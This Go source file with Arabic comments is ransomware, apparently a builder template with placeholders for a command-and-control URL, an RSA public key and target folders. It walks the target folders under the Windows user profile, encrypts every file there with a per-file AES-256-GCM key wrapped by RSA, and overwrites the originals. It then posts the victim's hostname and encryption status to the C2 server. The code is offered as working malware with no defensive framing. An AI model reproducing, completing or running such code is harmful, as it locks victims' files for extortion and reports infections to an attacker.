package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
)

const C2ServerUrl = "__C2_SERVER_URL__"
const PublicKeyPEM = "__PUBLIC_KEY__"
const TargetDirsString = "__TARGET_DIRECTORIES__"

// توليد مفتاح AES عشوائي لكل ملف أو جلسة
func generateAESKey() ([]byte, error) {
	key := make([]byte, 32) // AES-256
	_, err := rand.Read(key)
	return key, err
}

func encryptAES(plainText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plainText, nil), nil
}

func encryptRSA(plainText []byte, pubKey *rsa.PublicKey) ([]byte, error) {
	hash := sha256.New()
	return rsa.EncryptOAEP(hash, rand.Reader, pubKey, plainText, nil)
}

func parsePublicKey(pemString string) (*rsa.PublicKey, error) {
	block, _ := pem.Decode([]byte(pemString))
	if block == nil {
		return nil, nil
	}
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		cert, errCert := x509.ParseCertificate(block.Bytes)
		if errCert == nil {
			if pubKey, ok := cert.PublicKey.(*rsa.PublicKey); ok {
				return pubKey, nil
			}
		}
		return nil, err
	}
	return pub.(*rsa.PublicKey), nil
}

func processFiles() {
	userProfile := os.Getenv("USERPROFILE")
	if userProfile == "" {
		userProfile = "C:\\Users\\Default"
	}

	pubKey, err := parsePublicKey(PublicKeyPEM)
	if err != nil || pubKey == nil {
		return
	}

	targetDirectories := strings.Split(TargetDirsString, ",")

	for _, dirName := range targetDirectories {
		dirName = strings.TrimSpace(dirName)
		if dirName == "" {
			continue
		}

		targetDir := filepath.Join(userProfile, dirName)
		if _, err := os.Stat(targetDir); err == nil {
			filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				data, err := os.ReadFile(path)
				if err != nil {
					return nil
				}

				// 1. إنشاء مفتاح AES عشوائي لتشفير الملف
				aesKey, err := generateAESKey()
				if err != nil {
					return nil
				}

				encryptedData, err := encryptAES(data, aesKey)
				if err != nil {
					return nil
				}

				// 2. تشفير مفتاح AES باستخدام RSA العام
				encryptedKey, err := encryptRSA(aesKey, pubKey)
				if err != nil {
					return nil
				}

				// دمج المفتاح المشفر مع البيانات
				finalPayload := append(encryptedKey, encryptedData...)
				os.WriteFile(path, finalPayload, 0644)

				return nil
			})
		}
	}
}

func reportBack() {
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "Unknown-PC"
	}

	data := url.Values{}
	data.Set("hostname", hostname)
	data.Set("ip_address", "192.168.1.100")
	data.Set("os", "Windows")
	data.Set("encryption_key", PublicKeyPEM)
	data.Set("encryption_type", "HYBRID")
	data.Set("status", "hybrid_encrypted")

	resp, err := http.PostForm(C2ServerUrl, data)
	if err == nil {
		resp.Body.Close()
	}
}

func main() {
	processFiles()
	reportBack()
}